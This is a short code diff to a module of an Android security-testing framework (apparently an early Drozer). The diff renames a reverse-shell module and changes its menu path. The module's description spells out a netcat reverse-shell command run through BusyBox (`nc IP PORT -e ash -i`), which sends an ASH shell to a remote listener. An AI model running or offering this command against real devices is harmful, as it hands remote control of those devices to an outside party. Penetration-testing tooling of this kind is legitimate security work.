@@ -1,16 +1,16 @@
 from mwr.droidhg.modules import common, Module
 
-class Reverse(Module, common.BusyBox, common.ClassLoader, common.FileSystem, common.Shell):
+class Send(Module, common.BusyBox, common.ClassLoader, common.FileSystem, common.Shell):
 
     name = "Send an ASH shell to a remote listener."
     description = """Send an ASH Shell to a remote listener.
 
-This module executes `nc IP PORT -e ash -i`, using BusyBox. This will send a remote shell to a netcat listener."""
+This module executes `nc IP PORT -e ash -i`, using BusyBox. This will send an ASH shell to a netcat listener."""
     examples = ""
     author = "Tyrone (@mwrlabs)"
     date = "2012-11-06"
     license = "MWR Code License"
-    path = ["exploit", "shell"]
+    path = ["shell"]
 
     def add_arguments(self, parser):
         parser.add_argument("ip", help="ip address of the remote listener", nargs="?")
